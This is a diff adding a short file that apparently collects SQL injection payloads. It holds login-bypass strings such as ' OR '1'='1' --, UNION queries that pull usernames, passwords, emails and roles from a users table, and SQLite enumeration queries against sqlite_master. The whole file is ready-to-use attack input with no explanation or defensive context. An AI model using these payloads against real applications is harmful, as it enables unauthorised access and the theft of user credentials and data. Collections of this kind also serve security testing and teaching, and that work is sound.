@@ -1,0 +1,16 @@
+' OR '1'='1' --
+' OR 1=1 --
+admin' --
+' OR '1'='1' /* 
+
+
+Union Base Attacks:-
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT username, password, email, role, NULL FROM users --
+' UNION SELECT sqlite_version(), NULL, NULL, NULL, NULL --
+
+
+
+Database Enumeration:-
+' UNION SELECT name, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' --
+' UNION SELECT sql, NULL, NULL, NULL, NULL FROM sqlite_master WHERE name='users' --
